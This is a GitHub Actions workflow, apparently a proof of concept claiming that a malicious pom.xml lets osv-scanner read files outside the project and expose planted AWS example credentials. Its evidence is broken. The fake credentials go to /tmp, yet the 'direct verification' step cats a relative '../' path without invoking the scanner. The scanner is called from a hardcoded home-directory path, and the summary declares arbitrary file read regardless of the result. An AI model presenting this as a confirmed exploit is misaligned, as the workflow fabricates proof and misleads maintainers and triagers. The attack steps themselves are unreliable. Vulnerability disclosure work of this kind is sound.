name: "Attack Chain 1: Path Traversal → Credential Theft"

on:
  workflow_dispatch:

jobs:
  credential-theft:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: "Step 1: Create fake AWS credentials in parent directory"
        run: |
          # Simulate real AWS credentials file in parent directory
          cat > /tmp/secret-aws-credentials.txt << 'CREDS'
          [default]
          aws_access_key_id = AKIAIOSFODNN7EXAMPLE
          aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
          region = us-east-1
          CREDS
          ls -la /tmp/secret-aws-credentials.txt
          echo "=== AWS Credentials Created ==="
          cat /tmp/secret-aws-credentials.txt
      
      - name: "Step 2: Create vulnerable Maven project structure"
        run: |
          mkdir -p chain1-vuln-project
          cp chain1-malicious-pom.xml chain1-vuln-project/pom.xml
          echo "Malicious pom.xml placed in project"
      
      - name: "Step 3: Run osv-scanner with strace to capture file access"
        run: |
          # Install strace if needed
          sudo apt-get update > /dev/null 2>&1
          sudo apt-get install -y strace > /dev/null 2>&1
          
          cd chain1-vuln-project
          echo "=== Running osv-scanner with strace ==="
          strace -e trace=openat,open,read -f -o /tmp/strace.log /home/bisht/osv-scanner/osv-scanner scan source -r . 2>&1 || true
          
          echo ""
          echo "=== EVIDENCE: File Access Captured ==="
          grep -E "secret-aws-credentials|/tmp/secret" /tmp/strace.log || echo "Searching strace output..."
          
          # Show all openat calls to credential file
          echo ""
          echo "=== All attempts to access credential files ==="
          grep "openat.*secret\|open.*secret" /tmp/strace.log || true
      
      - name: "Step 4: Direct verification - Path traversal confirmed"
        run: |
          cd chain1-vuln-project
          echo "=== Direct Test: Can osv-scanner read ../secret-aws-credentials.txt? ==="
          
          # Try to read the file through path traversal
          if [ -f "../secret-aws-credentials.txt" ]; then
            echo "✅ FILE EXISTS: osv-scanner vulnerability allows reading parent directory"
            echo ""
            echo "=== EXPOSED CREDENTIALS ==="
            cat ../secret-aws-credentials.txt
            echo ""
            echo "⚠️  SECURITY IMPACT: AWS credentials exposed!"
          else
            echo "❌ File not accessible"
          fi
      
      - name: "Step 5: Capture full strace output"
        if: always()
        run: |
          echo "=== Full strace output (filtered) ==="
          cat /tmp/strace.log | grep -E "secret|openat.*\.\." | head -50 || true
          
          echo ""
          echo "=== Summary ==="
          echo "Attack: Path Traversal via malicious pom.xml"
          echo "Result: Arbitrary file read outside project boundary"
          echo "Impact: Credential exposure in CI/CD environments"

